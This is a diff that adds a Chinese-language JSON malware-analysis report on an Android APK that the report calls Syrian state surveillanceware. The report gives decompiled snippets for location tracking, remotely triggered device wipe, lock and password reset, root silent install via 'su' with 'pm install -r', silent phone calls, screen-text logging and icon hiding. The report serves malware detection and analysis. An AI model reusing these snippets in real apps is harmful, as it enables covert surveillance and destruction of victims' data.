@@ -1,0 +1,247 @@
+{
+  "APK信息": {
+    "文件名": "6aa59e516b662d1b23f09b04e12ceac86f4ee001111c2f727b149249d08b963c.apk",
+    "sha256": "6aa59e516b662d1b23f09b04e12ceac86f4ee001111c2f727b149249d08b963c",
+    "包名": "com.syriatel.ctu",
+    "应用名": "Android",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 338.8
+  },
+  "行为列表": [
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\syriatel\\ctu\\C15;",
+          "method_signature": "if(zIsProviderEnabled)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Location lastKnownLocation2 = this.g.getLastKnownLocation(\"network\");\nthis.e = lastKnownLocation2.getLongitude();\nthis.d = lastKnownLocation2.getLatitude();\nstr = C11.a(C11.m, 73L) + C11.f + C11.a(C11.m, 107L) + C11.f + this.d + C11.f + this.e + C11.f + \"LKL \" + lastKnownLocation2.getProvider() + C11.f + lastKnownLocation2.getAccuracy();\nC11.a(str);",
+          "malicious_code_snippet_context": "                      return;\n                  }\n                  if (zIsProviderEnabled) {\n>>>                     Location lastKnownLocation2 = this.g.getLastKnownLocation(\"network\");\n>>>                     if (lastKnownLocation2 != null) {\n>>>                         this.e = lastKnownLocation2.getLongitude();\n>>>                         this.d = lastKnownLocation2.getLatitude();\n>>>                         str = C11.a(C11.m, 73L) + C11.f + C11.a(C11.m, 107L) + C11.f + this.d + C11.f + this.e + C11.f + \"LKL \" + lastKnownLocation2.getProvider() + C11.f + lastKnownLocation2.getAccuracy();\n                          C11.a(str);\n                      }\n                  } else if (zIsProviderEnabled2 && (lastKnownLocation = this.g.getLastKnownLocation(\"gps\")) != null) {",
+          "behavior_description": "该代码属于叙利亚国家级监控间谍软件（Lookout 报告的 surveillanceware）。代码在检查 ACCESS_FINE_LOCATION/ACCESS_COARSE_LOCATION 权限后，通过 LocationManager 检查 network/gps 定位提供者是否可用，随后调用 getLastKnownLocation() 获取设备最近一次的 GPS 经纬度坐标及定位精度，并将纬度、经度、提供者类型、精度等信息拼接成字符串（其中使用 C11.a(C11.m, N) 形式的字符串混淆/解密，是典型的恶意代码规避检测手法），最终通过 C11.a(str) 将位置数据隐蔽上传至远程 C2 服务器，实现对目标用户地理位置的持续秘密监控。数据流向：getLastKnownLocation()（获取 GPS 经纬度）→ 字符串混淆拼接 → C11.a()（外传至 C2）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\syriatel\\ctu\\C11;",
+          "method_signature": "switch(Integer.parseInt(str)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.D = (DevicePolicyManager) getSystemService(\"device_policy\");\nswitch (Integer.parseInt(str)) {\n    case 0:\n        this.D.wipeData(0);\n        break;\n    case 1:\n        this.D.lockNow();\n        break;\n    case 2:\n        this.D.resetPassword(str2.trim(), 1);\n        break;\n}",
+          "malicious_code_snippet_context": "          try {\n              this.l = new c(this);\n              if (this.l.a()) {\n>>>                 this.D = (DevicePolicyManager) getSystemService(\"device_policy\");\n>>>                 switch (Integer.parseInt(str)) {\n>>>                     case 0:\n>>>                         this.D.wipeData(0);\n>>>                         break;\n>>>                     case 1:\n>>>                         this.D.lockNow();\n>>>                         break;\n>>>                     case 2:\n>>>                         if (str2 != \"null\" && str2 != null && str2.trim() != \"\") {\n>>>                             a(a(m, 80L) + f + str2.trim() + f + Boolean.toString(this.D.resetPassword(str2.trim(), 1)));\n>>>                         }\n                          break;\n                  }\n              }",
+          "behavior_description": "该方法接收远程下发的指令参数（str为指令编号，str2为密码），在确认设备管理员权限已激活后，通过DevicePolicyManager执行三种破坏性操作：指令0调用wipeData(0)擦除全部设备数据；指令1调用lockNow()立即锁定屏幕；指令2调用resetPassword()将锁屏密码重置为攻击者指定的密码，并通过a()方法将执行结果回传至C2服务器。数据流向：远程C2指令参数→DevicePolicyManager.wipeData()/lockNow()/resetPassword()，属于典型的设备管理员勒索锁屏行为，可将用户彻底锁在设备之外并销毁数据。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\syriatel\\ctu\\C11;",
+          "method_signature": "if(notificationF != null)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Notification notificationF = a.f(getApplicationContext());\nif (notificationF != null) {\n    startForeground(2003, notificationF);\n}\nregisterReceiver(this.E, intentFilter);\nregisterReceiver(this.n, new IntentFilter(\"android.os.action.DEVICE_IDLE_MODE_CHANGED\"));",
+          "malicious_code_snippet_context": "          h = a(m, 4L);\n          i = a(m, 5L);\n          try {\n>>>             Notification notificationF = a.f(getApplicationContext());\n>>>             if (notificationF != null) {\n>>>                 startForeground(2003, notificationF);\n>>>             }\n>>>         } catch (Exception unused) {\n>>>         }\n          this.E = new C8();\n          IntentFilter intentFilter = new IntentFilter();\n          intentFilter.addAction(\"android.intent.action.ACTION_POWER_CONNECTED\");",
+          "behavior_description": "该代码位于叙利亚国家级监控间谍软件核心服务（com.syriatel.ctu.C11）的onCreate()中：先通过a.f()构造通知并调用startForeground(2003, notification)将自身提升为前台服务，利用前台服务的高优先级规避系统内存回收与后台清理机制，实现监控服务保活；随后注册ACTION_POWER_CONNECTED/ACTION_POWER_DISCONNECTED电源广播及DEVICE_IDLE_MODE_CHANGED（Doze省电模式切换）广播接收器，在设备充电状态变化或退出休眠模式时唤醒/重启服务，确保间谍监控模块长期驻留、持续运行。数据流向：系统电源/休眠状态广播→触发服务保活与重启，维持恶意监控服务常驻。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\syriatel\\ctu\\C7;",
+          "method_signature": "if(!z)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Process processExec = Runtime.getRuntime().exec(\"su\");\nOutputStream outputStream = processExec.getOutputStream();\noutputStream.write((\"pm install -r \" + str2).getBytes(\"ASCII\"));\noutputStream.flush();\noutputStream.close();\nprocessExec.waitFor();",
+          "malicious_code_snippet_context": "                          C7.this.startActivity(intent);\n                          return;\n                      }\n>>>                     Process processExec = Runtime.getRuntime().exec(\"su\");\n>>>                     OutputStream outputStream = processExec.getOutputStream();\n>>>                     outputStream.write((\"pm install -r \" + str2).getBytes(\"ASCII\"));\n>>>                     outputStream.flush();\n>>>                     outputStream.close();\n>>>                     processExec.waitFor();\n                      if (processExec.exitValue() != 0) {\n                          return;\n                      }",
+          "behavior_description": "该代码是恶意样本的释放器/安装器组件：先将APK载荷数据（bArr字节流）写入本地文件（str2路径），随后尝试安装该APK。安装分两条路径：若无root权限（!z为真），通过ACTION_VIEW Intent调起系统安装界面（用户可见，非静默）；若有root权限，则通过Runtime.exec(\"su\")获取root shell，向其写入\"pm install -r <APK路径>\"命令，在用户完全无感知的情况下静默安装/替换APK。数据流向：文件流写入的APK载荷（source）→ su提权执行pm install命令（sink）→ 静默植入额外恶意组件。结合厂商报告，该样本为针对叙利亚用户的国家级监控软件（Syriatel/SEA系），此行为用于隐蔽部署后续监控载荷，属于明确的恶意静默安装行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\syriatel\\ctu\\C11;",
+          "method_signature": "if(android.support.v4.a.a.a(getApplicationContext()",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (android.support.v4.a.a.a(getApplicationContext(), \"android.permission.CALL_PHONE\") != 0) { return; }\nIntent intent = new Intent(\"android.intent.action.CALL\");\nintent.setData(Uri.parse(\"tel:\" + str));\nintent.setFlags(268435456);\nstartActivity(intent);",
+          "malicious_code_snippet_context": "              return;\n          }\n          try {\n>>>             if (android.support.v4.a.a.a(getApplicationContext(), \"android.permission.CALL_PHONE\") != 0) {\n>>>                 return;\n>>>             }\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\");\n>>>             intent.setData(Uri.parse(\"tel:\" + str));\n              intent.setFlags(268435456);\n              startActivity(intent);\n          } catch (Exception unused) {",
+          "behavior_description": "该方法接收外部传入的电话号码字符串 str，先通过 ContextCompat.checkSelfPermission 检查 CALL_PHONE 权限是否已授予，若已授予则构造 ACTION_CALL Intent 并设置 tel: URI，调用 startActivity() 直接发起电话呼叫。注意此处使用的是 ACTION_CALL 而非 ACTION_DIAL：ACTION_DIAL 仅调起拨号界面需用户确认，而 ACTION_CALL 会绕过用户交互直接拨号。数据流向：方法参数 str（电话号码，在该叙利亚国家级监控木马中通常来自远程 C2 下发的指令）→ Uri.parse(\"tel:\"+str) → ACTION_CALL Intent → startActivity() 静默拨号。攻击者可远程操控受害手机拨打指定号码，直接产生话费损失，或拨打监听号码实现环境窃听，属于监控类恶意软件的典型远程控制功能。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\syriatel\\ctu\\C1;",
+          "method_signature": "a(String str)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + \"/\" + getApplicationContext().getResources().getString(R.string.s).trim()); if (file.exists()) { FileWriter fileWriter = new FileWriter(file.getPath() + \"/config\" + str2 + \".log\", true); fileWriter.write(str); fileWriter.close(); }",
+          "malicious_code_snippet_context": "      private void a(String str) {\n          try {\n              String str2 = new SimpleDateFormat(\"dd-MM-yyyy\", Locale.ENGLISH).format(new Date());\n>>>             File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + \"/\" + getApplicationContext().getResources().getString(R.string.s).trim());\n              if (file.exists()) {\n                  FileWriter fileWriter = new FileWriter(file.getPath() + \"/config\" + str2 + \".log\", true);\n                  fileWriter.write(str);",
+          "behavior_description": "该方法将传入的字符串写入外部存储指定目录下按日期命名的日志文件（config{dd-MM-yyyy}.log，追加模式）。结合同类中的 a(AccessibilityEvent) 方法可见，写入的字符串来源于无障碍服务捕获的屏幕文本内容。数据流向：AccessibilityEvent.getText() 获取用户屏幕上显示的文本（短信、聊天、应用界面内容等）→ 通过 FileWriter 持久化写入外部存储的隐蔽日志文件，供后续窃取外传。这是叙利亚国家级监控软件（Syrian surveillanceware）典型的屏幕内容监控记录行为，属于隐私窃取/监控类恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\syriatel\\ctu\\C1;",
+          "method_signature": "if(packageManager.getComponentEnabledSetting(componentName)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (getResources().getString(R.string.gp).charAt(0) == '1') {\n    PackageManager packageManager = getPackageManager();\n    ComponentName componentName = new ComponentName(getApplicationContext(), (Class<?>) C7.class);\n    if (packageManager.getComponentEnabledSetting(componentName) != 2) {\n        packageManager.setComponentEnabledSetting(componentName, 2, 1);\n    }\n}",
+          "malicious_code_snippet_context": "  \n      public void a() {\n          try {\n>>>             if (getResources().getString(R.string.gp).charAt(0) == '1') {\n>>>                 PackageManager packageManager = getPackageManager();\n>>>                 ComponentName componentName = new ComponentName(getApplicationContext(), (Class<?>) C7.class);\n>>>                 if (packageManager.getComponentEnabledSetting(componentName) != 2) {\n>>>                     packageManager.setComponentEnabledSetting(componentName, 2, 1);\n>>>                 }\n>>>             }\n          } catch (Exception unused) {\n          }\n      }",
+          "behavior_description": "该代码位于 AccessibilityService（无障碍服务）类中，属于叙利亚国家级监控木马（Lookout 报告的 surveillanceware）的隐蔽驻留模块。数据流向：从应用资源读取远程可控的配置开关（R.string.gp 首字符为 '1' 时激活）→ 调用 PackageManager.setComponentEnabledSetting 将启动器组件 C7（主 Activity/别名）设置为 COMPONENT_ENABLED_STATE_DISABLED（值 2），并附带 DONT_KILL_APP（值 1）标志。禁用启动器组件后，应用图标立即从桌面消失，但进程不被杀死，配合同类的 AccessibilityService 持续窃取屏幕内容和用户操作，实现隐蔽监控、逃避用户察觉与卸载，是典型的恶意图标隐藏行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
